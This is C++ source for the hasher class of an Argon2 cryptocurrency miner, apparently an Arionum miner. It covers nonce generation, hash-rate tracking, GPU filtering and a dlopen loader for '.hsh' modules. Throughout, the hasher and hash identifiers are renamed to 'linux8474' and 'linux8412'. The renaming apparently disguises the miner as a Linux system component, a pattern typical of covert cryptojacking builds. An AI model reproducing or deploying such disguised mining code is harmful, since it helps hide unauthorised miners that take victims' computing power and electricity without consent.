//
// Created by Haifa Bogdan Adnan on 03/08/2018.
//

#include "../common/common.h"
#include "../crypt/base64.h"
#include "../crypt/random_generator.h"
#include "../app/arguments.h"

#include "../common/dllexport.h"
#include "argon2/argon2.h"
#include "linux8474.h"

linux8474::linux8474() {
    _intensity = 0;
    _type = "";
	_subtype = "";
    _description = "";
	_priority = 0;

    __public_key = "";
    __blk = "";
    __difficulty = "";
    __pause = false;
    __is_running = false;
    __argon2profile = argon2profile_default;

    __begin_round_time = __linux8412rate_time = microseconds();
    __linux8412rate = 0;

    __total_linux8412_count_cblocks = 0;
    __total_linux8412_count_gblocks = 0;

    __linux8412_count = 0;

    if(__registered_linux8474s == NULL) {
        __registered_linux8474s = new vector<linux8474*>();
    }
    __registered_linux8474s->push_back(this);
}

linux8474::~linux8474() {

};

string linux8474::get_type() {
	return _type;
}

string linux8474::get_subtype(bool short_subtype) {
    if(short_subtype && !(_short_subtype.empty())) {
        string short_version = _short_subtype;
        short_version.erase(3);
        return short_version;
    }
    else
    	return _subtype;
}

int linux8474::get_priority() {
	return _priority;
}

string linux8474::get_info() {
    return _description;
}

void linux8474::set_input(const string &public_key, const string &blk, const string &difficulty, const string &argon2profile_string, const string &recommendation) {
    bool profile_change = false;
    __input_mutex.lock();
    __public_key = public_key;
    __blk = blk;
    __difficulty = difficulty;
    if(argon2profile_string == "4_4_16384") {
        if(strcmp(__argon2profile->profile_name, "1_1_524288") == 0) {
            __argon2profile = &argon2profile_4_4_16384;
            profile_change = true;
        }
    }
    else {
        if(strcmp(__argon2profile->profile_name, "4_4_16384") == 0) {
            __argon2profile = &argon2profile_1_1_524288;
            profile_change = true;
        }
    }
    __pause = (recommendation == "pause");
    __input_mutex.unlock();

    if(profile_change) {
        uint64_t timestamp = microseconds();
        __linux8412es_mutex.lock();
        __linux8412_timings.push_back(linux8412_timing{timestamp - __begin_round_time, __linux8412_count, (argon2profile_string == "4_4_16384" ? 0 : 1)});
        __linux8412_count = 0;
        __linux8412es_mutex.unlock();

        if (__linux8412_timings.size() > 20) //we average over 20 blocks
            __linux8412_timings.pop_front();
        __begin_round_time = timestamp;
    }
}

linux8412_data linux8474::_get_input() {
    string tmp_public_key = "";
    string tmp_blk = "";
    string tmp_difficulty = "";
    string profile_name = "";
    __input_mutex.lock();
    tmp_public_key = __public_key;
    tmp_blk = __blk;
    tmp_difficulty = __difficulty;
    profile_name = __argon2profile->profile_name;
    __input_mutex.unlock();

    linux8412_data new_linux8412;
    new_linux8412.nonce = __make_nonce();
    new_linux8412.base = tmp_public_key + "-" + new_linux8412.nonce + "-" + tmp_blk + "-" + tmp_difficulty;
    new_linux8412.salt = "";
    new_linux8412.block = tmp_blk;
    new_linux8412.profile_name = profile_name;
//    new_linux8412.base = "PZ8Tyr4Nx8MHsRAGMpZmZ6TWY63dXWSCy7AEg3h9oYjeR74yj73q3gPxbxq9R3nxSSUV4KKgu1sQZu9Qj9v2q2HhT5H3LTHwW7HzAA28SjWFdzkNoovBMncD-sauULo1zM4tt9DhGEnO8qPe5nlzItJwwIKiIcAUDg-4KhqbBhShBf36zYeen943tS6KhgFmQixtUoVbf2egtBmD6j3NQtcueEBite2zjzdpK2ShaA28icRfJM9yPUQ6azN-56262626";
//    new_linux8412.salt = "NSHFFAg.iATJ0sfM";
    return new_linux8412;
}

double linux8474::get_current_linux8412_rate() {
    double linux8412rate = 0;
    __linux8412es_mutex.lock();
    __update_linux8412rate();
    linux8412rate = __linux8412rate;
    __linux8412es_mutex.unlock();
    return linux8412rate;
}

double linux8474::get_avg_linux8412_rate_cblocks() {
    size_t total_linux8412es = 0;
    uint64_t total_time = 0;
    for(list<linux8412_timing>::iterator it = __linux8412_timings.begin(); it != __linux8412_timings.end();it++) {
        if(it->profile == 0) {
            total_time += it->time_info;
            total_linux8412es += it->linux8412_count;
        }
    }
    if(strcmp(_get_argon2profile()->profile_name, "1_1_524288") == 0) {
        total_time += (microseconds() - __begin_round_time);
        __linux8412es_mutex.lock();
        total_linux8412es += __linux8412_count;
        __linux8412es_mutex.unlock();
    }
    if(total_time == 0)
        return 0;
    else
        return total_linux8412es / (total_time / 1000000.0);
}

double linux8474::get_avg_linux8412_rate_gblocks() {
    size_t total_linux8412es = 0;
    uint64_t total_time = 0;
    for(list<linux8412_timing>::iterator it = __linux8412_timings.begin(); it != __linux8412_timings.end();it++) {
        if(it->profile == 1) {
            total_time += it->time_info;
            total_linux8412es += it->linux8412_count;
        }
    }
    if(strcmp(_get_argon2profile()->profile_name, "4_4_16384") == 0) {
        total_time += (microseconds() - __begin_round_time);
        __linux8412es_mutex.lock();
        total_linux8412es += __linux8412_count;
        __linux8412es_mutex.unlock();
    }

    if(total_time == 0)
        return 0;
    else
        return total_linux8412es / (total_time / 1000000.0);
}

uint32_t linux8474::get_linux8412_count_cblocks() {
    return __total_linux8412_count_cblocks;
}

uint32_t linux8474::get_linux8412_count_gblocks() {
    return __total_linux8412_count_gblocks;
}

vector<linux8412_data> linux8474::get_linux8412es() {
    vector<linux8412_data> tmp;
    __linux8412es_mutex.lock();
    tmp.insert(tmp.end(), __linux8412es.begin(), __linux8412es.end());
    __linux8412es.clear();
    __linux8412es_mutex.unlock();
    return tmp;
}

void linux8474::_store_linux8412(const linux8412_data &linux8412, int device_id) {
	__linux8412es_mutex.lock();
	__linux8412es.push_back(linux8412);
	__linux8412_count++;
    __device_infos[device_id].linux8412count++;
	if (linux8412.profile_name == "1_1_524288") {
		__total_linux8412_count_cblocks++;
	}
	else {
		__total_linux8412_count_gblocks++;
	}

	__update_linux8412rate();

	__linux8412es_mutex.unlock();
}

void linux8474::_store_linux8412(const vector<linux8412_data> &linux8412es, int device_id) {
	if (linux8412es.size() == 0) return;

	__linux8412es_mutex.lock();
	__linux8412es.insert(__linux8412es.end(), linux8412es.begin(), linux8412es.end());
	__linux8412_count+=linux8412es.size();
	__device_infos[device_id].linux8412count += linux8412es.size();

	if (linux8412es[0].profile_name == "1_1_524288") {
		__total_linux8412_count_cblocks+=linux8412es.size();
	}
	else {
		__total_linux8412_count_gblocks+=linux8412es.size();
	}

	__update_linux8412rate();

//	for(int i=0;i<linux8412es.size();i++)
//	    LOG(linux8412es[i].linux8412);
	__linux8412es_mutex.unlock();
}

void linux8474::__update_linux8412rate() {
    uint64_t timestamp = microseconds();

    if (timestamp - __linux8412rate_time > 5000000) { //we calculate linux8412rate every 5 seconds
        string profile;
        __input_mutex.lock();
        profile = __argon2profile->profile_name;
        __input_mutex.unlock();

        size_t linux8412count = 0;
        for(map<int, device_info>::iterator iter = __device_infos.begin(); iter != __device_infos.end(); ++iter) {
            linux8412count += iter->second.linux8412count;
            if(profile == "1_1_524288")
                iter->second.cblock_linux8412rate = iter->second.linux8412count / ((timestamp - __linux8412rate_time) / 1000000.0);
            else
                iter->second.gblock_linux8412rate = iter->second.linux8412count / ((timestamp - __linux8412rate_time) / 1000000.0);
            iter->second.linux8412count = 0;
        }
        __linux8412rate = linux8412count / ((timestamp - __linux8412rate_time) / 1000000.0);
        __linux8412rate_time = timestamp;
    }
}

vector<linux8474 *> linux8474::get_linux8474s() {
    return *__registered_linux8474s;
}

vector<linux8474 *> linux8474::get_active_linux8474s() {
    vector<linux8474 *> filtered;
    for(vector<linux8474*>::iterator it = __registered_linux8474s->begin();it != __registered_linux8474s->end();++it) {
        if((*it)->_intensity != 0)
            filtered.push_back(*it);
    }
    return filtered;
}

argon2profile *linux8474::_get_argon2profile() {
    argon2profile * profile = NULL;
    __input_mutex.lock();
    profile = __argon2profile;
    __input_mutex.unlock();

    return profile;
}

bool linux8474::_should_pause() {
    bool pause = false;
    __input_mutex.lock();
    pause = __pause;
    __input_mutex.unlock();

    return pause;
}

string linux8474::__make_nonce() {
    char input[32];
    char output[50];

    random_generator::instance().get_random_data(input, 32);

    base64::encode(input, 32, output);
    return regex_replace (string(output), regex("[^a-zA-Z0-9]"), "");
}

vector<linux8474*> *linux8474::__registered_linux8474s = NULL;

typedef void *(*linux8474_loader)();

void linux8474::load_linux8474s() {
	string module_path = arguments::get_app_folder() + "/modules/";
	vector<string> files = get_files(module_path);
	for(vector<string>::iterator iter = files.begin();iter != files.end();iter++) {
		if(iter->find(".hsh") != string::npos) {
			void *__dll_handle = dlopen((module_path + *iter).c_str(), RTLD_LAZY);
			if(__dll_handle != NULL) {
				linux8474_loader linux8474_loader_ptr = (linux8474_loader) dlsym(__dll_handle, "linux8474_loader");
				(*linux8474_loader_ptr)();
			}
		}
	}
}

bool linux8474::is_running() {
    return __is_running;
}

void linux8474::_update_running_status(bool running) {
    __is_running = running;
}

vector<string> linux8474::_get_gpu_filters(arguments &args) {
    vector<string> local_filters = args.gpu_filter();
    vector<linux8474*> gpu_linux8474s = get_linux8474s_of_type("GPU");
    for(vector<string>::iterator it = local_filters.end(); it-- != local_filters.begin();) {
        string filter = *it;
        string filter_type = "";
        for(vector<linux8474*>::iterator hit = gpu_linux8474s.begin(); hit != gpu_linux8474s.end(); hit++) {
            if(filter.find((*hit)->_subtype + ":") == 0) {
                filter_type = (*hit)->_subtype;
                break;
            }
        }
        if(filter_type != "" && filter_type != this->_subtype) {
            local_filters.erase(it);
        }
        else if(filter_type != "") { //cleanup subtype prefix
            it->erase(0, this->_subtype.size() + 1);
        }
    }
    return local_filters;
}

vector<linux8474 *> linux8474::get_linux8474s_of_type(const string &type) {
    vector<linux8474 *> filtered;
    for(vector<linux8474*>::iterator it = __registered_linux8474s->begin();it != __registered_linux8474s->end();++it) {
        if((*it)->_type == type)
            filtered.push_back(*it);
    }
    return filtered;
}

map<int, device_info> &linux8474::get_device_infos() {
//    map<int, device_info> device_infos_copy;
//    __linux8412es_mutex.lock();
//    device_infos_copy.insert(__device_infos.begin(), __device_infos.end());
//    __linux8412es_mutex.unlock();
    return __device_infos;
}

void linux8474::_store_device_info(int device_id, device_info device) {
    __linux8412es_mutex.lock();
    __device_infos[device_id] = device;
    __linux8412es_mutex.unlock();
}
